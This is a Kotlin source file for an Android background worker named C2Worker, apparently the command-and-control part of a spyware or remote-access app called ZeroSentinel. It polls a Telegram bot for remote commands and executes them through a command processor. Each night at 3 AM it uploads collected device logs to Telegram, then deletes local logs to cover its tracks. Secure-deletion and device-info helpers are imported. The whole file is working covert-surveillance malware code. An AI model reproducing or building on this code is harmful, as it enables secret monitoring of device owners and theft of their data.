package com.zero.sentinel.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.SecureDelete
import com.zero.sentinel.utils.DeviceInfoHelper
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class C2Worker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val repository = (appContext.applicationContext as ZeroSentinelApp).repository
    private val telegramClient = TelegramClient(appContext)
    private val commandProcessor = CommandProcessor(appContext, repository, telegramClient)

    // In a real production app, we should persist the last update ID to SharedPreferences
    // to avoid processing old messages. For now, we rely on Telegram's logic or simple memory if worker stays alive (it won't).
    // TODO: Ideally pass lastUpdateId via inputData or SharedPreferences.
    // However, getUpdates with offset=0 returns all unconfirmed updates. If we confirm them (by using offset = last_id + 1), they vanish.
    // So we need to store the last processed ID in SharedPreferences.
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("C2Worker", "Starting C2 Cycle")
            
            // Record Heartbeat
            (applicationContext.applicationContext as ZeroSentinelApp).prefsManager.saveLastHeartbeat(System.currentTimeMillis())

            // 1. Command Processing (Priority)
            processCommands()

            // 2. Upload Logs & Cleanup - Only at 3 AM or when triggered by /getlogs
            val currentHour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
            if (currentHour == 3) {
                Log.d("C2Worker", "3 AM detected - uploading logs and cleaning up")
                uploadLogs()
                cleanupLogs()
            }

            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e("C2Worker", "Error in C2 cycle", e)
            return@withContext Result.retry()
        }
    }

    private fun processCommands() {
        try {
            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
            val lastUpdateId = prefs.getLastUpdateId()
            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
            
            val updates = telegramClient.pollUpdates(nextOffset)
            val maxUpdateId = commandProcessor.processUpdates(updates)
            
            if (maxUpdateId > lastUpdateId) {
                prefs.saveLastUpdateId(maxUpdateId)
            }
        } catch (e: Exception) {
            Log.e("C2Worker", "Command processing failed", e)
        }
    }

    private suspend fun uploadLogs() {
        com.zero.sentinel.utils.LogUploadHelper.upload(
            applicationContext,
            repository,
            telegramClient
        )
    }

    private suspend fun cleanupLogs() {
        try {
            val cutoffTime = System.currentTimeMillis() - (24 * 60 * 60 * 1000) // 24 hours ago
            repository.deleteLogsOlderThan(cutoffTime)
            Log.i("C2Worker", "✅ Cleanup: Deleted logs older than 24 hours")
        } catch (e: Exception) {
            Log.e("C2Worker", "Error during cleanup", e)
        }
    }
}
